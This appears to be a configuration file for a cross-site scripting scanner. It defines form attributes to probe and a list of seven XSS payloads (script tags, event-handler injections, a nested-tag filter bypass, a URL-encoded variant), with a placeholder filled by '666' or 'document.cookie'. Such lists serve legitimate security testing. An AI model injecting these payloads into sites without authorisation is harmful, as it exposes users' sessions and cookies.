FORM_IDENTIFIERS = [
    'action',
    'name',
    'id'
]

FIRST_PAYLOAD_CONTENT = "666"
SECOND_PAYLOAD_CONTENT = "document.cookie"

XSS_PAYLOADS = [
    "<script>alert(REPLACE)</script>",
    "\"'><img src=x onerror=alert(REPLACE)>",
    "<svg/onload=alert(REPLACE)>",
    "';alert(REPLACE);//",
    "<scr<script>ipt>alert(REPLACE)</scr</script>ipt>",
    "%3Cscript%3Ealert(REPLACE)%3C%2Fscript%3E",
    "<body onload=alert(REPLACE)>",
]
